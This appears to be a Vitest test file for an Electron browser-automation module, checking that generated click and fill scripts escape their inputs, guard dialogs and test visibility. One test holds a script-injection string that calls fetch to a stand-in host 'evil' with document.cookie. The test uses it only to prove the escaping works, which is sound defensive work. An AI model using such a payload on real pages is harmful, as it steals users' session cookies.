import { describe, expect, it, vi } from 'vitest'

// The module imports electron at load; the pure script builders under test don't use it.
vi.mock('electron', () => ({ BrowserWindow: class {}, session: { fromPartition: () => ({}) } }))

const { stepScript, visibleScript } = await import('./localhostCapture')

describe('step scripts', () => {
  it('embeds selector and value as JSON literals, so they cannot break out', () => {
    const evil = `"); fetch("http://evil/"+document.cookie); ("`
    const fill = stepScript({ action: 'fill', selector: evil, value: evil })
    expect(fill).toContain(JSON.stringify(evil))
    expect(fill).not.toContain(`querySelector("${evil}")`)
    // The literal parses as a single string expression.
    expect(() => new Function(`return ${JSON.stringify(evil)}`)).not.toThrow()
  })

  it('guards native dialogs before acting and refuses file inputs', () => {
    for (const s of [
      stepScript({ action: 'click', selector: '#x' }),
      stepScript({ action: 'fill', selector: '#x', value: 'v' })
    ]) {
      expect(s).toContain('window.alert =')
      expect(s).toContain('window.confirm =')
      expect(s).toContain("'file inputs are not supported'")
    }
  })

  it('fills through the native value setter and fires input and change', () => {
    const s = stepScript({ action: 'fill', selector: '#x', value: 'v' })
    expect(s).toContain("getOwnPropertyDescriptor(Object.getPrototypeOf(el), 'value')")
    expect(s).toContain("new Event('input', { bubbles: true })")
    expect(s).toContain("new Event('change', { bubbles: true })")
  })

  it('reports an invalid selector from inside the page instead of throwing', () => {
    expect(stepScript({ action: 'click', selector: '##' })).toContain("return 'invalid CSS selector'")
    expect(visibleScript('##')).toContain("return 'invalid'")
  })

  it('checks visibility, not just presence, for wait_for', () => {
    const s = visibleScript('.dashboard')
    expect(s).toContain('getBoundingClientRect')
    expect(s).toContain("s.display !== 'none'")
  })
})
